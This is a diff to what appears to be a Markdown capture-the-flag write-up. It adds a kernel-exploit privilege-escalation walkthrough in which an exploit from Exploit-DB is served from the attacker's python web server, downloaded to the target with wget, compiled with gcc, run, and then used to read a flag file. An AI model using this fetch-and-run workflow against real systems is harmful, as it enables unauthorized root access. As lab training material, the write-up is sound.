@@ -172,7 +172,7 @@ As we are in the Linux realm, familiarity with Linux commands, in general, w
 
 ---
 
-### The flags
+### The Flags
 
 #### What is the host name of the target system?
 ```bash
@@ -205,3 +205,39 @@ Search on `Exploit-DB` on the `kernel 3.13.0`
 
 ---
 
+# Privilege Escalation: Kernel Exploits
+
+#### Get the kernel version
+```bash
+uname
+```
+
+Then download it from [Exploit-DB](https://www.exploit-db.com/)
+
+#### Start a python server
+```bash
+python3 -m http.server
+```
+
+#### Go to `/tmp/`
+
+```bash
+cd /tmp/
+```
+#### Download it to the machine
+```bash
+wget {ip}:8000/exploit.c
+```
+
+#### Compile and run
+```bash
+gcc exploit.c
+./a.out
+```
+
+#### Get the flag
+```bash
+cat /home/matt/flag1.txt
+```
+
+---
